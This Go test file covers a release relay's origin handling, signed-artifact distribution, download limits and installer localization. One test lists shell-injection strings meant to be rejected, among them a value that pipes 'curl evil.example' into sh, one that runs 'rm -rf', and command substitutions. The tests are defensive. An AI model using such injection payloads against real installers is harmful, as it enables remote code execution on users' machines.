package relay

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"mime"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	wanrelease "wanctl/internal/release"
)

func TestSkillsUsesConfiguredPublicOrigin(t *testing.T) {
	t.Setenv("WANCTL_PUBLIC_ORIGIN", "https://relay.example")
	req := httptest.NewRequest(http.MethodGet, "http://relay.internal/skills", nil)
	req.Host = "attacker.example"
	req.Header.Set("X-Forwarded-Proto", "http")
	rec := httptest.NewRecorder()

	New(EnvTokenStore("")).handleSkills(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	if strings.Contains(rec.Body.String(), "@WANCTL_RELAY@") {
		t.Fatal("response still contains relay placeholder")
	}
	if !strings.Contains(rec.Body.String(), "https://relay.example/skills") || strings.Contains(rec.Body.String(), "attacker.example") {
		t.Fatalf("response does not use configured public origin: %s", rec.Body.String())
	}
}

func TestSkillsRefusesRequestDerivedOrigin(t *testing.T) {
	t.Setenv("WANCTL_PUBLIC_ORIGIN", "")
	req := httptest.NewRequest(http.MethodGet, "https://attacker.example/skills", nil)
	rec := httptest.NewRecorder()

	New(EnvTokenStore("")).handleSkills(rec, req)

	if rec.Code != http.StatusServiceUnavailable || strings.Contains(rec.Body.String(), "attacker.example") {
		t.Fatalf("status = %d, body = %q", rec.Code, rec.Body.String())
	}
}

func signedDist(t *testing.T) string {
	t.Helper()
	return signedDistWith(t, []byte("signed binary"))
}

// signedDistWith builds a signed release directory whose one artifact,
// wanctl-linux-amd64, holds payload.
func signedDistWith(t *testing.T, payload []byte) string {
	t.Helper()
	dir := t.TempDir()
	name := wanrelease.ArtifactName("linux", "amd64")
	if err := os.WriteFile(filepath.Join(dir, name), payload, 0o755); err != nil {
		t.Fatal(err)
	}
	h := sha256.Sum256(payload)
	manifest := wanrelease.Manifest{
		Schema: 1, Version: "v1.0.0", PublishedAt: time.Now().UTC(),
		Artifacts: []wanrelease.Artifact{{OS: "linux", Arch: "amd64", Name: name, Size: int64(len(payload)), SHA256: hex.EncodeToString(h[:])}},
	}
	raw, _ := json.Marshal(manifest)
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	sig := ed25519.Sign(priv, raw)
	if err := os.WriteFile(filepath.Join(dir, wanrelease.ManifestName), raw, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, wanrelease.SignatureName), sig, 0o644); err != nil {
		t.Fatal(err)
	}
	// Stands in for the RSA signature a real release directory carries. Its
	// contents are never checked by the relay — it hands the bytes to the
	// install scripts, which verify them against their own embedded key.
	if err := os.WriteFile(filepath.Join(dir, wanrelease.RSASignatureName), []byte("rsa signature bytes"), 0o644); err != nil {
		t.Fatal(err)
	}
	wanrelease.TrustedPublicKeys = base64.StdEncoding.EncodeToString(pub)
	t.Cleanup(func() { wanrelease.TrustedPublicKeys = "" })
	return dir
}

func TestSignedDistribution(t *testing.T) {
	dir := signedDist(t)
	if err := os.WriteFile(filepath.Join(dir, "unsigned"), []byte("payload"), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WANCTL_DIST_DIR", dir)
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()

	// manifest.json.rsa.sig is what both install scripts fetch immediately after
	// the manifest; without it they abort before downloading anything, which is
	// how v0.1.3 shipped with installers that could not install.
	for _, path := range []string{"/dl/manifest.json", "/dl/manifest.json.sig", "/dl/manifest.json.rsa.sig", "/dl/wanctl-linux-amd64"} {
		resp, err := srv.Client().Get(srv.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("GET %s: status %d", path, resp.StatusCode)
		}
		if path == "/dl/wanctl-linux-amd64" {
			mediaType, params, err := mime.ParseMediaType(resp.Header.Get("Content-Disposition"))
			if err != nil || mediaType != "attachment" || params["filename"] != "wanctl-linux-amd64" {
				t.Errorf("GET %s: Content-Disposition = %q", path, resp.Header.Get("Content-Disposition"))
			}
		}
	}
	resp, err := srv.Client().Get(srv.URL + "/dl/unsigned")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("unsigned file status = %d, want 404", resp.StatusCode)
	}
}

func TestTamperedDistributionFailsClosed(t *testing.T) {
	dir := signedDist(t)
	if err := os.WriteFile(filepath.Join(dir, "wanctl-linux-amd64"), []byte("tampered"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WANCTL_DIST_DIR", dir)
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()
	resp, err := srv.Client().Get(srv.URL + "/dl/manifest.json")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("tampered distribution status = %d, want 503", resp.StatusCode)
	}
}

func TestDistributionChangeAfterStartupFailsClosed(t *testing.T) {
	dir := signedDist(t)
	t.Setenv("WANCTL_DIST_DIR", dir)
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()
	if err := os.WriteFile(filepath.Join(dir, "wanctl-linux-amd64"), []byte("changed after verification"), 0o755); err != nil {
		t.Fatal(err)
	}
	resp, err := srv.Client().Get(srv.URL + "/dl/wanctl-linux-amd64")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("changed artifact status = %d, want 503", resp.StatusCode)
	}
}

// Downloads in progress are bounded overall. The manifest and signatures are
// small, served from memory, and never wait for a download slot.
func TestDownloadsAreBoundedOverall(t *testing.T) {
	dir := signedDist(t)
	handler, err := newSignedDistHandler(dir)
	if err != nil {
		t.Fatal(err)
	}
	h := handler.(*signedDistHandler)
	h.downloads.total = maxDownloads
	get := func(name string) *httptest.ResponseRecorder {
		rec := httptest.NewRecorder()
		req := httptest.NewRequest(http.MethodGet, "/"+name, nil)
		req.URL.Path = name // signedDistHandler runs behind StripPrefix("/dl/").
		h.ServeHTTP(rec, req)
		return rec
	}
	if rec := get("wanctl-linux-amd64"); rec.Code != http.StatusServiceUnavailable || rec.Header().Get("Retry-After") == "" {
		t.Fatalf("download with every slot taken = %d (Retry-After %q), want 503 with Retry-After", rec.Code, rec.Header().Get("Retry-After"))
	}
	if rec := get(wanrelease.ManifestName); rec.Code != http.StatusOK {
		t.Fatalf("manifest with every download slot taken = %d, want 200", rec.Code)
	}
	h.downloads.total = 0
	if rec := get("wanctl-linux-amd64"); rec.Code != http.StatusOK || rec.Body.String() != "signed binary" {
		t.Fatalf("download = %d %q", rec.Code, rec.Body.String())
	}
	if h.downloads.total != 0 || len(h.downloads.byClient) != 0 {
		t.Fatalf("a finished download left its slot taken: %d in total, per client %v", h.downloads.total, h.downloads.byClient)
	}
}

// Ranges are served straight from the file, which is how an interrupted
// download resumes.
func TestDownloadServesRanges(t *testing.T) {
	t.Setenv("WANCTL_DIST_DIR", signedDist(t))
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()
	req, _ := http.NewRequest(http.MethodGet, srv.URL+"/dl/wanctl-linux-amd64", nil)
	req.Header.Set("Range", "bytes=7-")
	resp, err := srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusPartialContent || string(body) != "binary" {
		t.Fatalf("range request = %d %q, want 206 \"binary\"", resp.StatusCode, body)
	}
}

// Users who skip the upstream release page bootstrap from the relay, so the
// installers must be served rather than retired. They are not manifest-signed;
// see installerHandler for the trust limitation this accepts.
func TestRelayServesInstallers(t *testing.T) {
	dir := signedDist(t)
	for name, want := range map[string]string{
		"install.sh":  "#!/bin/sh\nunix installer\n",
		"install.ps1": "# windows installer\n",
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(want), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("WANCTL_DIST_DIR", dir)
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()
	for path, want := range map[string]string{
		"/install.sh":  "#!/bin/sh\nunix installer\n",
		"/install.ps1": "# windows installer\n",
	} {
		resp, err := srv.Client().Get(srv.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("GET %s = %d, want 200", path, resp.StatusCode)
		}
		if string(body) != want {
			t.Errorf("GET %s body = %q, want %q", path, body, want)
		}
	}
}

// A relay whose release directory lacks the installers reports that plainly
// instead of serving an empty file that would silently install nothing.
func TestRelayInstallerMissing(t *testing.T) {
	dir := signedDist(t)
	t.Setenv("WANCTL_DIST_DIR", dir)
	srv := httptest.NewServer(New(EnvTokenStore("")).Handler())
	defer srv.Close()
	resp, err := srv.Client().Get(srv.URL + "/install.ps1")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Errorf("GET /install.ps1 without file = %d, want 503", resp.StatusCode)
	}
}

// The whole point of a relay serving install.sh: whoever fetched it from here
// can reach here, and often cannot reach the release page it was built for.
func TestServedInstallerPointsAtServingRelay(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "install.sh"),
		[]byte("#!/bin/sh\nRELAY_SELF=\"\"\nBASE=\"https://github.example/releases\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "install.ps1"),
		[]byte("$relaySelf = ''\n$base = 'https://github.example/releases'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WANCTL_PUBLIC_ORIGIN", "https://relay.example/")

	for _, tc := range []struct{ path, want string }{
		{"/install.sh", `RELAY_SELF="https://relay.example"`},
		{"/install.ps1", `$relaySelf = 'https://relay.example'`},
	} {
		rec := httptest.NewRecorder()
		installerHandler(dir, strings.TrimPrefix(tc.path, "/"), "text/plain", installerOrigin())(
			rec, httptest.NewRequest(http.MethodGet, "http://relay.internal"+tc.path, nil))
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status = %d", tc.path, rec.Code)
		}
		if !strings.Contains(rec.Body.String(), tc.want) {
			t.Fatalf("%s: served installer not localized:\n%s", tc.path, rec.Body.String())
		}
	}
}

// The origin is spliced into two scripts that then get executed, so anything
// that would end the string literal must disable the rewrite rather than land
// in the file. An installer left alone still works via WANCTL_RELAY.
func TestInstallerOriginRejectsUnsafeValues(t *testing.T) {
	for _, bad := range []string{
		"https://relay.example\"; curl evil.example | sh; #",
		"https://relay.example' ; rm -rf /tmp/x ; '",
		"https://relay.example`id`",
		"https://relay.example $(id)",
		"https://relay.example\nRELAY_SELF=https://evil.example",
		"ftp://relay.example",
		"not-a-url",
	} {
		t.Setenv("WANCTL_PUBLIC_ORIGIN", bad)
		if got := installerOrigin(); got != "" {
			t.Errorf("installerOrigin(%q) = %q, want empty", bad, got)
		}
	}
	body := []byte("RELAY_SELF=\"\"\n")
	if out := localizeInstaller(body, "install.sh", ""); string(out) != string(body) {
		t.Fatalf("empty origin rewrote the installer: %q", out)
	}
}
